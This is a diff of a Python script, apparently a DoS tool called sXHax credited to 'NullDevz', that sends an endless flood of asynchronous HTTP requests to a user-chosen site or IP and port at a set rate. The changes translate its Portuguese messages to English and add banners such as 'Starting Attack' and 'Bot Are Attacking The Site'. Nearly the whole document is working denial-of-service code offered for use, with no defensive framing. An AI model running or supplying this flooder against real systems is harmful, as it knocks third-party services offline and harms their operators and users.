@@ -5,15 +5,15 @@ import argparse
 import asyncio
 import aiohttp
 
-# Limpa a tela do Termux
+GREEN = '\033[92m'
+RESET = '\033[0m'
+CYAN = '\033[96m'
+
 os.system('clear')
 
-print("sXHax DoS Attack By NullDevz GitHub: https://github.com/NullDevzHax/")
-
-# --- Funcionalidade de Envio de Requests Assíncronas ---
+print(f"{CYAN}SCRIPT MADE BY NULLDEVZ THIS IS AN DoS SCRIPT V1,GET IN GITHUB: https://github.com/NullDevzHax/sXHax{RESET}")
 
 async def send_request(session, url, port):
-    """Função assíncrona para enviar uma única requisição."""
     try:
         full_url = f"http://{url}:{port}"
         async with session.get(full_url, timeout=5) as response:
@@ -24,7 +24,6 @@ async def send_request(session, url, port):
         pass
 
 async def main():
-    """Função principal assíncrona para parsear argumentos e executar o envio."""
     parser = argparse.ArgumentParser(description="Script para enviar requests a um site ou IP usando asyncio.")
     parser.add_argument('-s', '--site', type=str, required=True, help="O endereço do site ou IP.")
     parser.add_argument('-p', '--porta', type=int, default=80, help="A porta (ex: 80).")
@@ -36,14 +35,16 @@ async def main():
     port = args.porta
     turbo = args.turbo
 
-    print(f"\nIniciando envio de requests assíncronas...")
+    print(f"\nStarting Attack....")
     print(f"Site/IP: {site}")
-    print(f"Porta: {port}")
-    print(f"Turbo (requests/segundo): {turbo}")
+    print(f"Port: {port}")
+    print(f"Turbo (requests/seconds): {turbo}")
 
     async with aiohttp.ClientSession() as session:
         while True:
             start_time = time.time()
+            
+            print(f"{GREEN}Bot Are Attacking The Site ✓{RESET}")
 
             tasks = [send_request(session, site, port) for _ in range(turbo)]
             await asyncio.gather(*tasks, return_exceptions=True)
@@ -57,4 +58,3 @@ async def main():
 if __name__ == "__main__":
     if len(sys.argv) > 1:
         asyncio.run(main())
-
